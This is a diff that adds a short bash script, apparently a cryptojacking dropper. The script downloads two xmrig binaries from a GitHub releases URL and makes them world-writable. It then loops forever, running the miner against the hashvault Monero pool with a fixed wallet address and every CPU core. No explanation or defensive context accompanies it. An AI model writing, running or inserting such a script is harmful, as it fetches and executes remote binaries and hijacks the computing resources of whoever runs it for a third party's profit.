@@ -1,0 +1,7 @@
+#!/bin/bash
+wget -O mone https://github.com/rxt36q6/file/releases/download/1/xmrigArm
+wget https://github.com/rxt36q6/file/releases/download/1/xmrigMiner
+chmod 777 xmrigMiner mone
+while true; do
+./mone --url pool.hashvault.pro:443 --user 84bEkQaAvXnPXXghsfBYBeLGtkAV8eP1HX7rP7EUBE1pHvtwAffjCE2SzzY8y79fkgHA21czuEWoVUDkAf7e4qM5KMKCKVK --pass x --donate-level 1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14 -t $(nproc --all)
+done
